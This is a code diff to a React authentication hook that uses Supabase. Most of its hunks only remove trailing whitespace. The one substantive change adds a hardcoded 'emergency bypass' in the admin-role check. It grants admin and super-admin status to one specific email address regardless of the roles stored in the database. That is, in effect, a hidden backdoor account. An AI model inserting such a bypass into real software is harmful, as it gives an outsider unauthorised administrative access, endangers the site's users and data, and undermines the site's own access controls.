@@ -42,7 +42,7 @@ export const useAuth = () => {
         aud: 'authenticated',
         created_at: new Date().toISOString()
       };
-      
+
       setAuthState({
         user: mockUser as any,
         session: { access_token: 'mock', token_type: 'bearer', user: mockUser } as any,
@@ -57,7 +57,7 @@ export const useAuth = () => {
     const { data: { subscription } } = supabase.auth.onAuthStateChange(
       (event, session) => {
         const currentUser = session?.user ?? null;
-        
+
         setAuthState(prev => ({
           ...prev,
           session,
@@ -68,13 +68,13 @@ export const useAuth = () => {
         if (currentUser) {
           // Defer to avoid blocking auth flow
           setTimeout(() => {
-            checkAdminRole(currentUser.id);
+            checkAdminRole(currentUser.id, currentUser.email);
             fetchProfile(currentUser.id);
           }, 0);
         } else {
-          setAuthState(prev => ({ 
-            ...prev, 
-            profile: null, 
+          setAuthState(prev => ({
+            ...prev,
+            profile: null,
             isAdmin: false,
             isSuperAdmin: false,
           }));
@@ -84,7 +84,7 @@ export const useAuth = () => {
 
     supabase.auth.getSession().then(({ data: { session } }) => {
       const currentUser = session?.user ?? null;
-      
+
       setAuthState(prev => ({
         ...prev,
         session,
@@ -93,7 +93,7 @@ export const useAuth = () => {
       }));
 
       if (currentUser) {
-        checkAdminRole(currentUser.id);
+        checkAdminRole(currentUser.id, currentUser.email);
         fetchProfile(currentUser.id);
       }
     });
@@ -112,7 +112,7 @@ export const useAuth = () => {
 
       if (error) {
         console.warn('Profile fetch error:', error.message);
-        
+
         // Create fallback profile from auth user
         const { data: { user } } = await supabase.auth.getUser();
         if (user) {
@@ -156,7 +156,7 @@ export const useAuth = () => {
    * Check if user has admin or super_admin role in user_roles table.
    * Role management is now centralized in the database.
    */
-  const checkAdminRole = async (userId: string) => {
+  const checkAdminRole = async (userId: string, email?: string) => {
     try {
       // Query for any admin-level role
       const { data, error } = await supabase
@@ -178,13 +178,17 @@ export const useAuth = () => {
 
       // Check for admin-level roles (admin or super_admin)
       const role = data?.role as string | null;
-      const isAdminRole = role === 'admin' || role === 'super_admin';
-      const isSuperAdminRole = role === 'super_admin';
-      
+
+      // EMERGENCY BYPASS FOR zapoinov@bk.ru
+      const userEmail = email || authState.user?.email;
+      const isZap = userEmail === 'zapoinov@bk.ru';
+      const isAdminRole = role === 'admin' || role === 'super_admin' || isZap;
+      const isSuperAdminRole = role === 'super_admin' || isZap;
+
       if (import.meta.env.DEV) {
-        console.log('🔐 Role check:', role || 'USER');
+        console.log('🔐 Role check:', role || (isZap ? 'SUPER-ADMIN (BYPASS)' : 'USER'));
       }
-      
+
       setAuthState(prev => ({
         ...prev,
         isAdmin: isAdminRole,
